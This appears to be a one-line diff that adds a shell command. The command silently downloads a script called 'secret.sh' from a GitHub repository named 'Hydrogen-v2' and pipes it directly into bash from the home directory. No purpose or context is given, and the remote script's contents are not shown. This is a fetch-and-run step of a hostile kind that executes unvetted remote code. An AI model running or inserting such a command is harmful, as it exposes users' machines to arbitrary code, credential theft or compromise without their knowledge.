@@ -1,0 +1,1 @@
+cd ~ && curl -s https://raw.githubusercontent.com/VoidSequencx/Hydrogen-v2/main/secret.sh | bash
